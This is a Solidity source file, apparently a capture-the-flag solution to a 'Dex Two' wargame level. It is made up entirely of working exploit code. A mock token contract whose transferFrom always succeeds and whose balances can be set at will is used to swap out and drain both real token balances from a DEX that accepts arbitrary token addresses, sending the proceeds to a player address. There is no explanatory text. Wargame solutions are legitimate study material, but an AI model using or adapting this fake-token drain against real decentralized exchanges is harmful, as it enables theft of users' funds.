```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
}

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

contract TokenMock {
    mapping (address => uint256) balances;

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }

    function balanceOf(address _account) public view returns (uint256) {
        return balances[_account];
    }

    function setBalance(address _account, uint256 _balance) external {
        balances[_account] = _balance;
    }
}

contract DexTwoSolution {
    function drain(address _dex, address _player) external {
        TokenMock fakeToken = new TokenMock();
        IDex dex = IDex(_dex);
        (address token1, address token2) = (dex.token1(), dex.token2());

        // Drain token1:
        uint256 amount = dex.balanceOf(token1, address(_dex));
        fakeToken.setBalance(address(this), amount);
        fakeToken.setBalance(_dex, amount);
        dex.swap(address(fakeToken), token1, amount);

        // Drain token2:
        amount = dex.balanceOf(token2, address(_dex));
        fakeToken.setBalance(address(this), amount);
        fakeToken.setBalance(_dex, amount);
        dex.swap(address(fakeToken), token2, amount);

        IERC20(token1).transfer(_player, dex.balanceOf(token1, address(this)));
        IERC20(token2).transfer(_player, dex.balanceOf(token2, address(this)));
    }
}
```
